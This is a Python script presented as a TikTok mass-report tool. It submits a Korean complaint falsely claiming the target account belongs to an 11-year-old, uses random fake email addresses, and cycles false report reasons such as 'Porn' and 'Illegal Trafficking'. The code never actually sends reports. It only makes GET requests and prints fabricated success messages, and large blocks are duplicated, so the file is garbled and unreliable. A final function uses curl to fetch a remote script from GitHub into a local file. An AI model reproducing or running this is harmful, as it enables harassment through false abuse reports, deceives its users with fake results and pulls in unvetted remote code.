

import os
import time
import random
try:
        import requests
        import re
except:
        os.system("pip3 install requests")

try:
        from bs4 import BeautifulSoup as soups
except:
        os.system("pip3 install bs4")

class API:
        server = "https://www.tiktok.com/"
        conn = "https://www.tiktok.com/legal/report/feedback"

class text:
        thanchu = "안녕하세요 틱톡팀입니다. 이 계정은 TikTok에 적 합하지 않습니다. 이 아이는 내 아이입니다. 나 는 아기 의 엄 마입니 다. 이 계정은 내   아들이 만들 었고 Tik Tok  계정을 가질 수  있는 나이 가 되지  않았으며 TikTok 커 뮤니티의 기준을 따르지 않 습니다.  소년 은 또한 사생활을  침해하고 Tik Tok 계정을 등록 하기 위 해 가짜 출 생 정보를 제공했 습니 다. 이 계정 은 11세 의 계정이며, 저는 어머 니로서 이 계정이 11세 의 계정임을 확인합 니다. TikTok 커뮤니  티 표준에 따라 자녀의 계정 을  검토 하고 일 시 중지하 십시 오. Tiktok이  내   자녀의 계정을 정 지하기를 바랍니다.  감사  합니 다 틱톡!!!"

os.system("cls" if os.name == "nt" else "clear")
print()
print("REPORT TIKTOK BY CHIEN")
print("+ Report 13 Year Old and Random Report All Video")
print()
id1 = input("Enter User ID : ")

def check():
        session = requests.Session()
        result = session.get(API.server + id1)
        content = result.text
        if result.status_code == 200:
                print("[✓] Check Found User ID")
                pass
        else:
                print("[-] Not Found Account User ID")
                exit()
check()

def report_13_year():
        for i in range(1, 99999):

                uname = [
                        "a", "b", "c", "d", "e", "f", "g",
                        "A", "B", "C", "D", "E", "F", "G",
                        "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
                ]
                name = random.choice(uname)
                domain = "@gmail.com"
                email = str(name + domain)

                session = requests.Session()
                data = {
                        "Email": email,
                        "TikTok ID": f"{id1}",
                        "<input>": f"{text.thanchu}"
                }
                rp = session.get(API.conn)
                cont = rp.text
                try:
                        time.sleep(10)
                        print("[✓] Report Done", i, "Random Report")
                except:
                        exit()
report_13_year()

class fake_interface():
        user_agent = [
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
        ]
        choi = random.choice(user_agent)
        headers = {"User-Agent": choi}

class target:
        page_1 = "https://www.tiktok.com/"
        page_2 = "https://www.tiktok.com/support"
        page_3 = "https://www.tiktok.com/report"

def reported():
        def deleted_session():
                os.system("cls" if os.name == "nt" else "clear")
        deleted_session()
        print("Ex : @test_user_id_123")
        user_id = input("Enter Your Username TIKTOK : ")
        def check_user_id():
                output = requests.get(target.page_1 + user_id)
                content = output.text
                def result():
                        if output.status_code == 200:
                                if "Follower" in content:
                                        print("[*] Found User_ID")
                                        pass
                                else:
                                        print("[-] Failed, Please Check Agian User_ID")
                                        exit()
                        else:
                                print("[-] Failed, Please Check Agian User_ID")
                                exit()
                result()
        check_user_id()

        time.sleep(1.2)
        print("Set Username ID is :", user_id)
        print("EX : reported 10 (video)")
        video = int(input("Number Report video : "))
        print("[*] Starting reported ")
        for i in range(1, video + 1):
                print("[-] start report video :", i)
                for report in range(1, 10):
                        name_report = [
                                "Impersonation",
                                "Porn",
                                "Illegal Trafficking",
                                "emotional problem",
                                "Inappropriate content"
                        ]
                        name = random.choice(name_report)
                        def rp():
                                results = requests.get(target.page_1 + user_id)
                                if results.status_code == 200:
                                        data = results.text
                                        if "Follower" in data:
                                                report = random.randint(1, 10)
                                                print("[*] Report Success Number", report, "name report :", name)
                                                time.sleep(0.50)
                                        else:
                                                print("[-] Report Failed, Please Check Agian User_ID")
                                                exit()
                                else:
                                        print("[-] Report Failed, Please Check Agian User_ID")
                                        exit()
                rp()
class fake_interface():
        user_agent = [
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
        ]
        choi = random.choice(user_agent)
        headers = {"User-Agent": choi}

class user:
        usr = [
                "@combat8",
                "@noname211220",
                "@combat12003",
                "@nguynbubs",
                "@thangbi93",
                "@t.thanhdz",
                "@thngnooz",
                "@yeuhoang90",
                "@thanpbi99",
                "@thangbi_",
                "@thangbi5",
                "@thangbi7",
                "@thangbi93",
                "@user107380187",
                "@user186394081",
                "@user208189300",
                "@user206409610",
                "@user0861938399",
                "@user75939109389",
                "@user1937010389",
                "@user1833038173",
                "@user91739038300",
                "@user17363938739",
                "@user18394947399",
                "@user717379281782",
                "@user107380187",
                "@user186394081",
                "@user208189300",
                "@user206409610",
                "@user0861938399",
                "@user75939109389",
                "@user1937010389",
                "@user1833038173",
                "@user91739038300",
                "@user17363938739",
                "@user18394947399",
                "@user717379281782",
                "@user107380187",
                "@user9163849378",
                "@user1937038372",
                "@user1833038173",
                "@user91739038300",
                "@user17363938739",
                "@user18394947399",
                "@user717379281782",
                "@user107380187",
                "@user9163849378",
                "@user1937038372",
                "@user1833038173",
                "@user91739038300",
                "@user17363938739",
                "@user18394947399",
                "@user717379281782",
                "@user107380187",
                "@user9163849378",
                "@user1937038372",
                "@user1833038173",
                "@user91739038300",
                "@user17363938739",
                "@user18394947399",
                "@user717379281782",
                "@user107380187",
                "@user9163849378",
                "@user1937038372",
                "@user1833038173",
                "@user91739038300",
                "@user17363938739",
                "@user18394947399",
                "@user717379281782",
                "@user107380187",
                "@user9163849378",
                "@user1937038372",
                "@user1833038173",
                "@user91739038300",
                "@user17363938739",
                "@user18394947399",
                "@user717379281782",
                "@user107380187",
                "@user9163849378",
                "@user1937038372",
        ]
        
class target:
        page_1 = "https://www.tiktok.com/"
        page_2 = "https://www.tiktok.com/support"
        page_3 = "https://www.tiktok.com/report"

def reported():
        def deleted_session():
                os.system("cls" if os.name == "nt" else "clear")
        deleted_session()
        print("Ex : @test_user_id_123")
        user_id = input("Enter Your Username TIKTOK : ")
        def check_user_id():
                output = requests.get(target.page_1 + user_id)
                content = output.text
                def result():
                        if output.status_code == 200:
                                if "Follower" in content:
                                        print("[*] Found User_ID")
                                        pass
                                else:
                                        print("[-] Failed, Please Check Agian User_ID")
                                        exit()
                        else:
                                print("[-] Failed, Please Check Agian User_ID")
                                exit()
                result()
        check_user_id()

        time.sleep(1.2)
        print("Set Username ID is :", user_id)
        print("EX : reported 10 (video)")
        video = int(input("Number Report video : "))
        print("[*] Starting reported ")
        for i in range(1, video + 1):
                print("[-] start report video :", i)
                for report in range(1, 10):
                        name_report = [
                                "Impersonation",
                                "Porn",
                                "Illegal Trafficking",
                                "emotional problem",
                                "Inappropriate content"
                        ]
                        name = random.choice(name_report)
                        def rp():
                                results = requests.get(target.page_1 + user_id)
                                if results.status_code == 200:
                                        data = results.text
                                        if "Follower" in data:
                                                report = random.randint(1, 10)
                                                print("[*] Report Success Number", report, "name report :", name)
                                                time.sleep(0.50)
                                        else:
                                                print("[-] Report Failed, Please Check Agian User_ID")
                                                exit()
                                else:
                                        print("[-] Report Failed, Please Check Agian User_ID")
                                        exit()
                rp()
class fake_interface():
        user_agent = [
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
        ]
        choi = random.choice(user_agent)
        headers = {"User-Agent": choi}

class target:
        page_1 = "https://www.tiktok.com/"
        page_2 = "https://www.tiktok.com/support"
        page_3 = "https://www.tiktok.com/report"

def reported():
        def deleted_session():
                os.system("cls" if os.name == "nt" else "clear")
        deleted_session()
        print("Ex : @test_user_id_123")
        user_id = input("Enter Your Username TIKTOK : ")
        def check_user_id():
                output = requests.get(target.page_1 + user_id)
                content = output.text
                def result():
                        if output.status_code == 200:
                                if "Follower" in content:
                                        print("[*] Found User_ID")
                                        pass
                                else:
                                        print("[-] Failed, Please Check Agian User_ID")
                                        exit()
                        else:
                                print("[-] Failed, Please Check Agian User_ID")
                                exit()
                result()
        check_user_id()

        time.sleep(1.2)
        print("Set Username ID is :", user_id)
        print("EX : reported 10 (video)")
        video = int(input("Number Report video : "))
        print("[*] Starting reported ")
        for i in range(1, video + 1):
                print("[-] start report video :", i)
                for report in range(1, 10):
                        name_report = [
                                "Impersonation",
                                "Porn",
                                "Illegal Trafficking",
                                "emotional problem",
                                "Inappropriate content"
                        ]
                        name = random.choice(name_report)
                        def rp():
                                results = requests.get(target.page_1 + user_id)
                                if results.status_code == 200:
                                        data = results.text
                                        if "Follower" in data:
                                                report = random.randint(1, 10)
                                                print("[*] Report Success Number", report, "name report :", name)
                                                time.sleep(0.50)
                                        else:
                                                print("[-] Report Failed, Please Check Agian User_ID")
                                                exit()
                                else:
                                        print("[-] Report Failed, Please Check Agian User_ID")
                                        exit()
                rp()
class fake_interface():
        user_agent = [
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
        ]
        choi = random.choice(user_agent)
        headers = {"User-Agent": choi}

class target:
        page_1 = "https://www.tiktok.com/"
        page_2 = "https://www.tiktok.com/support"
        page_3 = "https://www.tiktok.com/report"

def reported():
        def deleted_session():
                os.system("cls" if os.name == "nt" else "clear")
        deleted_session()
        print("Ex : @test_user_id_123")
        user_id = input("Enter Your Username TIKTOK : ")
        def check_user_id():
                output = requests.get(target.page_1 + user_id)
                content = output.text
                def result():
                        if output.status_code == 200:
                                if "Follower" in content:
                                        print("[*] Found User_ID")
                                        pass
                                else:
                                        print("[-] Failed, Please Check Agian User_ID")
                                        exit()
                        else:
                                print("[-] Failed, Please Check Agian User_ID")
                                exit()
                result()
        check_user_id()

        time.sleep(1.2)
        print("Set Username ID is :", user_id)
        print("EX : reported 10 (video)")
        video = int(input("Number Report video : "))
        print("[*] Starting reported ")
        for i in range(1, video + 1):
                print("[-] start report video :", i)
                for report in range(1, 10):
                        name_report = [
                                "Impersonation",
                                "Porn",
                                "Illegal Trafficking",
                                "emotional problem",
                                "Inappropriate content"
                        ]
                        name = random.choice(name_report)
                        def rp():
                                results = requests.get(target.page_1 + user_id)
                                if results.status_code == 200:
                                        data = results.text
                                        if "Follower" in data:
                                                report = random.randint(1, 10)
                                                print("[*] Report Success Number", report, "name report :", name)
                                                time.sleep(0.50)
                                        else:
                                                print("[-] Report Failed, Please Check Agian User_ID")
                                                exit()
                                else:
                                        print("[-] Report Failed, Please Check Agian User_ID")
                                        exit()
                rp()
                
def file():
        os.system("curl https://raw.githubusercontent.com/Phamchie/server/main/sv.py >> server.py")
        with open("server.py", "r") as f:
                f.read()        
